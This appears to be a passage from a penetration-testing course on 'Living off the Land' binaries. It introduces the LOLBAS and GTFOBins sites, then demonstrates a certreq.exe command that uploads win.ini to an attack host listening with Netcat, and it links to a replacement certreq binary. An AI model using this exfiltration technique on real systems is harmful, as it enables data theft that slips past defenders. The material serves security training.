The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.

### LOLBAS

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

#### Upload win.ini to our Pwnbox

Upload win.ini to our Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

This will send the file to our Netcat session, and we can copy-paste its contents.

#### File Received in our Netcat Session

File Received in our Netcat Session

```shell-session
glack@htb[/htb]$ sudo nc -lvnp 80

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.
